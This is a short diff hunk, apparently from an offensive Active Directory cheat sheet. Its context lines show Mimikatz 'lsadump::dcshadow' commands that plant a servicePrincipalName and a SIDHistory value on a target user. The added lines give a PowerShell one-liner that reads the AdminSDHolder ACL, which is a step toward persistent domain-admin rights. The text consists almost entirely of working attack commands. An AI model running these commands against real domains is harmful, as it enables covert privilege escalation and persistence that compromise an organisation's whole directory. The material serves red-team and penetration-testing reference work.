@@ -878,4 +878,7 @@ lsadump::dcshadow /object:TargetUser /attribute:servicePrincipalName /value:"Sup
 # Set SID History for user
 lsadump::dcshadow /object:TargetUser /attribute:SIDHistory /value:S-1-5-21-280565432-1493477821-700767426-345
 # Requires retrieval of current ACL:
+(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=AdminSDHolder,CN=System,DC=targetdomain,DC=com")).psbase.ObjectSecurity.sddl
+# Then get target user SID:
+
 ```
